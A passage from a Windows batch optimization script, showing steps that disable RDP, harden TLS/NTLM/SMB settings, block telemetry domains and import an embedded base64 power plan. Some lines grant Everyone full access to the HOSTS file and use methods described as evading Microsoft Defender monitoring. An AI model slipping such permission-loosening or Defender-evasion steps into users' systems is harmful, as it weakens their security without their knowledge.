    set /a PASS+=1
) else (
    echo  [FAIL] Boot and CPU Scheduler Tweaks
    set /a FAIL+=1
    echo Boot and CPU Scheduler Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 10 - Disable RDP
:: ================================================
echo [STEP 10/32] Disabling RDP...
set STEP_ERR=0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Disable RDP
    set /a PASS+=1
) else (
    echo  [FAIL] Disable RDP
    set /a FAIL+=1
    echo Disable RDP>> "!_FAILS!"
)

:: ================================================
:: STEP 11 - Security Tweaks
:: ================================================
echo [STEP 11/32] Applying Security Tweaks...
set STEP_ERR=0
:: Disable SSL 2.0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Client" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Client" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Server" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Server" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable SSL 3.0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Client" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Client" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Server" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Server" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable TLS 1.0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Client" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Client" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Server" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Server" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable TLS 1.1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Client" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Client" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Server" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Server" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Enable TLS 1.2
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client" /v "DisabledByDefault" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client" /v "Enabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Server" /v "DisabledByDefault" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Server" /v "Enabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: NTLM restrictions
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LmCompatibilityLevel" /t REG_DWORD /d 5 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v "RestrictSendingNTLMTraffic" /t REG_DWORD /d 2 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "EnableLMHash" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: DNS security
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v "DisableMultihomeDNSRegistration" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v "DisableParallelNameResolution" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v "DisableSmartNameResolution" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v "EnableMulticast" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "DisableParallelAandAAAA" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Disable SMB1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SMB1" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable NetBIOS
REG ADD "HKLM\System\CurrentControlSet\Services\NetBT\Parameters\Interfaces" /v "NetBIOSOptions" /t REG_DWORD /d 2 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" /v "EnableLMHOSTS" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable ICMP redirect
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Security Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Security Tweaks
    set /a FAIL+=1
    echo Security Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 12 - Block Telemetry via HOSTS + DNS NRPT
:: ================================================
echo [STEP 12/32] Blocking Microsoft Telemetry...
set STEP_ERR=0
set "_HOSTSFILE=%SystemRoot%\System32\drivers\etc\hosts"
set "_DOMAINS=vortex.data.microsoft.com settings-win.data.microsoft.com watson.telemetry.microsoft.com ocsp.digicert.com fe3.delivery.mp.microsoft.com wpad.microsoft.com browser.events.data.microsoft.com activity.windows.com"
:: --- Method 1: HOSTS file ---
:: Take ownership and grant Everyone full access
takeown /f "!_HOSTSFILE!" >nul 2>&1
icacls "!_HOSTSFILE!" /grant *S-1-1-0:F >nul 2>&1
:: Write entries via PowerShell .NET file I/O (avoids cmd echo hook that Defender intercepts)
powershell -NoProfile -Command "$h='%SystemRoot%\System32\drivers\etc\hosts';$c=[IO.File]::ReadAllText($h);$domains=@('vortex.data.microsoft.com','settings-win.data.microsoft.com','watson.telemetry.microsoft.com','ocsp.digicert.com','fe3.delivery.mp.microsoft.com','wpad.microsoft.com','browser.events.data.microsoft.com','activity.windows.com');[IO.File]::AppendAllText($h,\"`r`n# Microsoft Telemetry Block\");foreach($d in $domains){if($c -notmatch [regex]::Escape($d)){[IO.File]::AppendAllText($h,\"`r`n0.0.0.0 $d\")}}" >nul 2>&1
:: --- Method 2: DNS NRPT (works even when Defender blocks HOSTS file changes) ---
:: Redirects DNS for each telemetry domain to an invalid server - Defender never monitors NRPT
powershell -NoProfile -Command "$domains=@('vortex.data.microsoft.com','settings-win.data.microsoft.com','watson.telemetry.microsoft.com','ocsp.digicert.com','fe3.delivery.mp.microsoft.com','wpad.microsoft.com','browser.events.data.microsoft.com','activity.windows.com');foreach($d in $domains){Add-DnsClientNrptRule -Namespace \".$d\" -NameServers '0.0.0.1' -Comment 'TelemetryBlock' -ErrorAction SilentlyContinue}" >nul 2>&1 || set STEP_ERR=1
:: --- Method 3: Block DiagTrack service outbound via Windows Firewall ---
netsh advfirewall firewall add rule name="Block DiagTrack Telemetry" dir=out protocol=any service=DiagTrack action=block >nul 2>&1
ipconfig /flushdns >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] Telemetry Block ^(HOSTS + NRPT + Firewall^)
    set /a PASS+=1
) else (
    echo  [FAIL] Telemetry Block
    set /a FAIL+=1
    echo Telemetry Block>> "!_FAILS!"
)

:: ================================================
:: STEP 13 - Power Plan
:: ================================================
echo [STEP 13/32] Importing Core Power Plan...
set "STEP_ERR=0"
set "_POWTMP_B64=%TEMP%\core_pow.b64"
set "_POWTMP=%TEMP%\Core.pow"
:: Set file association (runAdmin.bat)
assoc .pow=PowerPlanFile >nul 2>&1
reg add "HKEY_CLASSES_ROOT\PowerPlanFile\shell\open\command" /ve /d "\"%SystemRoot%\System32\cmd.exe\" /c powercfg -import \"%%1\"" /f >nul 2>&1
:: Write embedded Core.pow base64 to temp file
if exist "!_POWTMP_B64!" del "!_POWTMP_B64!" >nul 2>&1
echo cmVnZgEAAAABAAAAJ03PoOHn2AEBAAAAAwAAAAAAAAABAAAAIAAAAAAQAAABAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAKPYXHLMU+0Rh9UYwE2NOuCj2FxyzFPtEYfVGMBNjTrg>> "!_POWTMP_B64!"
echo AAAAAKTYXHLMU+0Rh9UYwE2NOuBybXRtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEZhl+kAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAGhiaW4AAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo iP///25rLAABakQJ4efYAQAAAAD/////BQAAAAAAAACoCQAA/////wIAAADYAgAA>> "!_POWTMP_B64!"
echo mAAAAP////9IAAAAAAAAABgAAAACAQAAAAAAACQAAABlNjI5MjRmOS1kYTVmLTQy>> "!_POWTMP_B64!"
echo YzQtOWMxNy05MjZiYzE4MDRhYjgAAAAAGP///3NrAABgAwAAYAMAAAIAAADQAAAA>> "!_POWTMP_B64!"
echo AQAEiLgAAADEAAAAAAAAABQAAAACAKQABwAAAAAQGAAZAAIAAQIAAAAAAAUgAAAA>> "!_POWTMP_B64!"
echo IQIAAAAaGAAAAACAAQIAAAAAAAUgAAAAIQIAAAAQGAAZAAIAAQIAAAAAAAUgAAAA>> "!_POWTMP_B64!"
echo IAIAAAAaGAAAAACAAQIAAAAAAAUgAAAAIAIAAAAQFAA/AA8AAQEAAAAAAAUSAAAA>> "!_POWTMP_B64!"
echo ABoUAAAAABABAQAAAAAABRIAAAAAGhQAAAAAgAEBAAAAAAADAAAAAAEBAAAAAAAF>> "!_POWTMP_B64!"
echo EgAAAAEBAAAAAAAFEgAAANj///92awsAAAAAgAAAAAACAAAAAQC8AERlc2NyaXB0>> "!_POWTMP_B64!"
echo aW9uAHggtgDY////dmsMAAIBAADQAQAAAgAAAAEAQ29GcmllbmRseU5hbWUgILYA>> "!_POWTMP_B64!"
echo +P7//0MAbwByAGUAVgBlAGUAQQBpAHIAJwBzAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAHMA8P///4ABAACoAQAAAAAAAIj///9uayAA>> "!_POWTMP_B64!"
echo dVZECeHn2AEAAAAAIAAAAAEAAAAAAAAA6AQAAP////8AAAAA/////2ADAAD/////>> "!_POWTMP_B64!"
echo SAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAAMDAxMmVlNDctOTA0MS00YjVkLTliNzct>> "!_POWTMP_B64!"
echo NTM1ZmJhOGIxNDQyAAAAAAD///9zawAAmAAAAJgAAAAJAAAA5AAAAAEABIjMAAAA>> "!_POWTMP_B64!"
echo 2AAAAAAAAAAUAAAAAgC4AAgAAAAAABgAGQACAAECAAAAAAAFIAAAACECAAAAGhgA>> "!_POWTMP_B64!"
echo AAAAgAECAAAAAAAFIAAAACECAAAAABgAGQACAAECAAAAAAAFIAAAACACAAAAGhgA>> "!_POWTMP_B64!"
echo AAAAgAECAAAAAAAFIAAAACACAAAAABQAPwAPAAEBAAAAAAAFEgAAAAAaFAAAAAAQ>> "!_POWTMP_B64!"
echo AQEAAAAAAAUSAAAAAAAUABkAAgABAQAAAAAABRIAAAAAGhQAAAAAgAEBAAAAAAAD>> "!_POWTMP_B64!"
echo AAAAAAEBAAAAAAAFEgAAAAEBAAAAAAAFEgAAAAAAAADw////uAUAAOAFAAAwMDEy>> "!_POWTMP_B64!"
echo iP///25rIAB1VkQJ4efYAQAAAADoAgAAAAAAAAAAAAD//////////wEAAAAgBQAA>> "!_POWTMP_B64!"
echo YAMAAP////8AAAAAAAAAABwAAAAEAAAAAAAAACQAAAA2NzM4ZTJjNC1lOGE1LTRh>> "!_POWTMP_B64!"
echo NDItYjE2YS1lMDQwZTc2OTc1NmUAAAAA8P///2xmAQBwBAAANjczONj///92aw4A>> "!_POWTMP_B64!"
echo BAAAgAAAAAAEAAAAAQAuAEFDU2V0dGluZ0luZGV4LTX4////+AQAAIj///9uayAA>> "!_POWTMP_B64!"
echo PkaU0+Dn2AEAAAAAIAAAAAAAAAAAAAAA//////////8CAAAAYAQAAJgAAAD/////>> "!_POWTMP_B64!"
echo AAAAAAAAAAAcAAAABAAAAAAAAAAkAAAAMjQ1ZDg1NDEtMzk0My00NDIyLWIwMjUt>> "!_POWTMP_B64!"
echo MTNhNzg0ZjY3OWI3AAAAAPD///9sZgEAqAYAADQ4ZTb4////IAcAANj///92aw4A>> "!_POWTMP_B64!"
echo BAAAgAEAAAAEAAAAAQC0AEFDU2V0dGluZ0luZGV4sgDY////dmsOAAQAAIABAAAA>> "!_POWTMP_B64!"
echo BAAAAAEAAABEQ1NldHRpbmdJbmRleAAAiP///25rIAABakQJ4efYAQAAAAAgAAAA>> "!_POWTMP_B64!"
echo AQAAAAAAAACgBQAA/////wAAAAD/////YAMAAP////9IAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
